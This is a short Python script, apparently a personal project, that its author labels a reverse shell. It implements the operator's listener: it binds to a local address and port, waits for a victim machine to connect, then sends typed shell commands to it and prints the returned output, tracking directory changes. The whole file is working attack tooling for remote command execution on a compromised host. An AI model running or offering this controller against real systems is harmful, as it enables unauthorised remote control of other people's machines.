#!/usr/bin/python3

# A python Reverse-shell
# Developed by Elieroc
# Start of project : 25/11/2020
# Actual version : 1.1

import socket

host, port = ('192.168.1.100', 1235)

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((host, port))
print('Le serveur est démarré !'+"\n")

while True:
    socket.listen()
    conn, address = socket.accept()
    print("/!\ Client connecté /!\ ")

    path = conn.recv(9999).decode("utf8") + '$ '
    print(path)

    while True:
        data=str( input(path) )

        if data[:2] == "cd":
            data = data.encode("utf8")
            conn.send(data)
            path = conn.recv(9999)
            path = str( path.decode("utf-8", errors="ignore")) + '$ '
        else:

            data = data.encode("utf8")
            conn.send(data)

            data = conn.recv(9999)
            data = str( data.decode("utf-8", errors="ignore"))
            print("\n"+data)

conn.close()
socket.close()
